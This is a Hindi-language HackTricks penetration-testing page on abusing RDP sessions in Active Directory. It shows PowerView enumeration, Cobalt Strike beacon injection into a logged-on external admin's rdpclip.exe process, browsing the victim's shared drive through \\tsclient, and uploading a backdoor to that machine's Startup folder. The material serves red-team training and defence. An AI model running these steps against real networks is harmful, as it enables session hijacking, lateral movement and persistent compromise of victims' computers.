# RDP सत्रों का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## RDP प्रक्रिया इंजेक्शन

यदि **बाहरी समूह** के पास वर्तमान डोमेन में किसी भी **कंप्यूटर** तक **RDP पहुंच** है, तो एक **हमलावर** उस **कंप्यूटर को समझौता कर सकता है और उसका इंतजार कर सकता है**।

एक बार जब उस उपयोगकर्ता ने RDP के माध्यम से पहुंच प्राप्त कर ली, तो **हमलावर उस उपयोगकर्ता के सत्र में पिवट कर सकता है** और बाहरी डोमेन में इसकी अनुमतियों का दुरुपयोग कर सकता है।
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

यदि एक उपयोगकर्ता **RDP के माध्यम से एक मशीन** में प्रवेश करता है जहाँ एक **हमलावर** उसके लिए **इंतज़ार** कर रहा है, तो हमलावर **उपयोगकर्ता के RDP सत्र में एक बीकन इंजेक्ट** करने में सक्षम होगा और यदि **शिकार ने RDP के माध्यम से पहुँचते समय अपना ड्राइव माउंट किया** है, तो **हमलावर उसे एक्सेस कर सकता है**।

इस मामले में आप बस **शिकार के** **मूल कंप्यूटर** को **बैकडोर** लिखकर **समझौता** कर सकते हैं **स्टार्टअप फ़ोल्डर** में।
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
